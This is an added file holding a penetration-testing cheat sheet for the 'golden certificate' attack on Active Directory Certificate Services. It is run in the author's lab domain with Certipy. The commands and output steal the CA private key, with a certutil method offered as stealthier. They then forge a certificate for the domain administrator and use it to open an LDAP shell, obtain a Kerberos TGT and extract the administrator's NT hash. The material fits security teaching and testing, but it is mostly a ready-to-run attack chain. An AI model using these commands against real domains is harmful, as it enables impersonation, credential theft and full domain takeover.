@@ -1,0 +1,136 @@
+==========================================================================================================================================
+Domain Privesc - Abusing ADCS - Forging Golden Certificates
+==========================================================================================================================================
+
+During a penetration test, gaining control of a Windows account with local administrator privileges on the server hosting the enterprise 
+Certificate Authority (CA) represents a critical security risk (the PKI/ADCS server should be considered as 'Tier 0').
+With that level of access, you can back-up the CA’s certificate and private key and then use them to create fraudulent authentication 
+certificates for arbitrary Active Directory users.
+In practice, this means you can generate a so‑called 'golden certificate' to impersonate any identity in the domain including highly 
+privileged accounts such as Domain Admins.
+
+Usefull links:
+--------------
+> https://bloodhound.specterops.io/resources/edges/golden-cert
+> https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Post%E2%80%90Exploitation
+> https://github.com/GhostPack/Certify/wiki/3-%E2%80%90-Domain-Persistence-Techniques#dpersist1---forging-certificates-with-stolen-ca-certificates
+> https://github.com/GhostPack/Certify
+> https://github.com/GhostPack/Rubeus
+> https://github.com/GhostPack/ForgeCert
+
+
+==========================================================================================================================================
+Basic PoC / test - Forging a golden certificate using the tool 'Certipy'
+==========================================================================================================================================
+
+------------------------------------------------------------------------------------------------------------------------------------------
+STEP 1 - Use the tool 'Certipy' to back-up the Certificate Authority (CA) certificate and private key with the credentials of a user 
+         who has local admin rigths over the Windows server hosting the enterprise CA (PKI).
+------------------------------------------------------------------------------------------------------------------------------------------
+
+Note: In the example below I used the local administrator account of the Windows server (WINSERVERPKI01 - 192.168.1.55) hosting the 
+      enterprise CA in my Lab environemnt.
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad ca -backup -ca 'Training-WINSERVERPKI01-CA' -username administrator -password 'REDACTED' -target 192.168.1.55
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Creating new service for backup operation
+[*] Creating backup
+[*] Retrieving backup
+[*] Got certificate and private key
+[*] Backing up original PFX/P12 to 'pfx.p12'
+[*] Backed up original PFX/P12 to 'pfx.p12'
+[*] Saving certificate and private key to 'Training-WINSERVERPKI01-CA.pfx'
+[*] Wrote certificate and private key to 'Training-WINSERVERPKI01-CA.pfx'
+[*] Cleaning up
+
+┌──(kali㉿kali)-[~]
+└─$ ls
+<SNIP>   pfx.p12  Training-WINSERVERPKI01-CA.pfx
+
+
+----------------------------------
+Alternative stealthier method
+----------------------------------
+If you have direct interactive shell access to the CA server (e.g., via RDP, PowerShell Remoting, or other command execution channels), 
+you can perform the CA key backup directly using built-in Windows commands. 
+This might be perceived as stealthier by avoiding the network traffic and service creation associated with remote tools like Certipy's backup module.
+
+C:\temp> certutil -backupKey -f -p SuperSecurePassw0rd! C:\Windows\Tasks\CaBackupFolder
+
+In this manual approach, certutil -backupKey is invoked directly.
+-f: Force overwrite if the target file/folder exists.
+-p SuperSecurePassw0rd!: The password to encrypt the PFX file.
+C:\Windows\Tasks\CaBackupFolder: A temporary directory where certutil will place the key files.
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+STEP 2 - Use the tool 'Certipy' to forge a 'golden' certificate for the domain account 'administrator' (admin of the DC)
+------------------------------------------------------------------------------------------------------------------------------------------
+
+> https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Post%E2%80%90Exploitation
+
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad forge -ca-pfx 'Training-WINSERVERPKI01-CA.pfx' -upn 'administrator@training.corp' -sid 'S-1-5-21-3600403915-1120367806-639521176-500' -crl 'ldap:///'
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Saving forged certificate and private key to 'administrator_forged.pfx'
+[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
+
+
+┌──(kali㉿kali)-[~]
+└─$ ls -al
+total 1352
+drwx------ 33 kali kali    4096 Dec 29 20:53 .
+drwxr-xr-x  3 root root    4096 Aug  8 08:59 ..
+-rw-rw-r--  1 kali kali    2430 Dec 29 20:53 administrator_forged.pfx
+-rw-rw-r--  1 kali kali    2683 Dec 29 20:20 pfx.p12
+-rw-rw-r--  1 kali kali    2381 Dec 29 20:20 Training-WINSERVERPKI01-CA.pfx
+<SNIP>
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+STEP 3 - Use the malicious certificate forged in STEP 2 to impersonate the domain account 'administrator' 
+         (ldapshell, request a TGT and its password NT hash) 
+------------------------------------------------------------------------------------------------------------------------------------------
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad auth -pfx 'administrator_forged.pfx' -dc-ip '192.168.1.17' -ldap-shell                                                                       
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@training.corp'
+[*]     SAN URL SID: 'S-1-5-21-3600403915-1120367806-639521176-500'
+[*]     Security Extension SID: 'S-1-5-21-3600403915-1120367806-639521176-500'
+[*] Connecting to 'ldaps://192.168.1.17:636'
+[*] Authenticated to '192.168.1.17' as: 'u:TRAINING\\Administrator'
+Type help for list of commands
+
+# whoami
+u:TRAINING\Administrator
+
+# exit
+Bye!
+
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad auth -pfx 'administrator_forged.pfx' -dc-ip '192.168.1.17' -domain 'training.corp'                                                           
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@training.corp'
+[*]     SAN URL SID: 'S-1-5-21-3600403915-1120367806-639521176-500'
+[*]     Security Extension SID: 'S-1-5-21-3600403915-1120367806-639521176-500'
+[*] Using principal: 'administrator@training.corp'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@training.corp': aad3b435b51404eeaad3b435b51404ee:<SNIP>
+
+Conclusion
+-----------
+=> I can now use the TGT (e.g., with the tool 'RUBEUS') or the NT hash to logon as the 'administrator' account.
